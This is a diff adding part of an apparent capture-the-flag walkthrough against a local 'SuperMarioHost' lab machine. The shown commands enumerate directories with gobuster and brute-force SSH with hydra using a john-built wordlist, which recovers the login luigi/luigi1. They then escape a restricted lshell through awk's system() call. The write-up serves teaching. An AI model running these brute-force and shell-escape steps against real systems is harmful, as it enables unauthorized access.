@@ -78,5 +78,60 @@ Perfect, now if we browser the website with the domain name we can see a differe
 
 Let's run `gobuster` on it.
 
+```
+$ gobuster dir -q -u http://mario.supermariohost.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -o gobuster2.txt
+/mario.php (Status: 200)
+/command.php (Status: 200)
+/luigi.php (Status: 200
+```
 
+I did some enumeration on them & the only things i found useful are the usernames `mario` & `luigi` we can do SSH brute force with them.
+
+We should craft first a wordlist using `john`, i'll use the `Wordlist` rule on the 2 usernames.
+
+## SSH brute force - Shell as luigi - Bypassing limited shell
+
+```
+$ touch usernames.txt
+$ printf "mario\nluigi" > usernames.txt 
+$ john -wordlist:usernames.txt -rules:Wordlist -stdout > wordlist.txt
+$ hydra -L usernames.txt -P wordlist.txt $ip ssh
+
+[DATA] attacking ssh://192.168.1.6:22/
+[STATUS] 97.00 tries/min, 97 tries in 00:01h, 114 to do in 00:02h, 16 active
+[22][ssh] host: 192.168.1.6   login: luigi   password: luigi1
+```
 `
+Let's login in!
+
+```
+$ ssh luigi@$ip
+luigi@192.168.1.6's password: 
+You are in a limited shell.
+Type '?' or 'help' to get the list of allowed commands
+luigi:~$ 
+```
+
+We're in a limited shell :
+
+```
+luigi:~$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+``` 
+
+Let's check what command we can run :
+
+```
+luigi:~$ ?
+awk  cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
+```
+
+We can exploit `awk` and open a normal `bash/sh` shell.
+
+```
+luigi:~$ awk 'BEGIN {system("/bin/bash")}'
+luigi@supermariohost:~$ whoami
+luigi
+```
+
+## Kernel privilege escalation
